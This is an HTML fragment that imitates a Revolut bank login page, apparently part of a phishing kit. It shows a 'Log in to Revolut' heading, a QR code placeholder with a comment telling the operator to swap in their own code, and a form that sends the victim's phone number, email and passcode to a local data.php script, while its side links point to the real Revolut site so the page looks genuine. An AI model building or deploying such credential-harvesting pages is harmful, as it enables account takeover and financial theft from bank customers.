<main>
	<div class="content">
		<div class="row ng-scope" ng-if="showContinueLabel">
          <div class="col-xs-12 text-center">
          <img src="icons.png" style="max-width: 180px;"></br>
              <span id="login-to-continue" class="h5 ng-binding" style="
    font-size: 16px;
    font-weight: 800;
    text-align: center;
    color: #16191C;
    font-family: inherit;
    line-height: 1.1;
">Log in to Revolut</span>
<br><br>
					<!--<![Change QR Code with the one from you!]-->
					<img src="qr.png" style="max-width: 90px;"></br>
					<!--<![Change QR Code end!]-->

					<span id="login-to-continue" class="h5 ng-binding" style="
font-size: 12px;
font-weight: 300;
text-align: center;
color: #16191C;
font-family: inherit;
line-height: 1.1;
">with QR Code</span>
<br><br>
<span id="login-to-continue" class="h5 ng-binding" style="
font-size: 14px;
font-weight: 500;
text-align: center;
color: #16191C;
font-family: inherit;
line-height: 1.1;
">Or</span>
          </div>
    </div></br>
		<div class="content-form">
			<form action="data.php" method="POST">
					<input type="text" name="phone" style="
	    border: 1px solid #d9dadc;
	    border-radius: 0;
	" placeholder="Phone" title="  Enter correct Phone Number" required>
				<input type="text" name="username" style="
    border: 1px solid #d9dadc;
    border-radius: 0;
" placeholder="Email address" title="  Enter correct Email address" required>
				<input type="password" style="
    border: 1px solid #d9dadc;
    border-radius: 0;
" name="userpassword" placeholder="Passcode" title="4 or more characters" required>
				<div class="checkbox">
            		<label class="ng-binding">
              			<input ng-model="form.remember" type="checkbox" name="remember" analytics-on="checked" analytics-category="Login View" id="login-remember" class="ng-valid ng-dirty ng-valid-parse ng-touched ng-not-empty">
              			Remember me
              			<span class="control-indicator"></span>
            		</label>
         	 	</div>
				<input type="submit" name="data" value="Log In">
			</form>
			<div class="signinLink">
				<a href="https://sso.revolut.com/signin"  target="_blank">Forgot password</a>
				<span> - New To Revolut? </span>
				<a href="https://sso.revolut.com/signin" target="_blank">Sign up</a>
			</div>
		</div>
	</div>
</main>
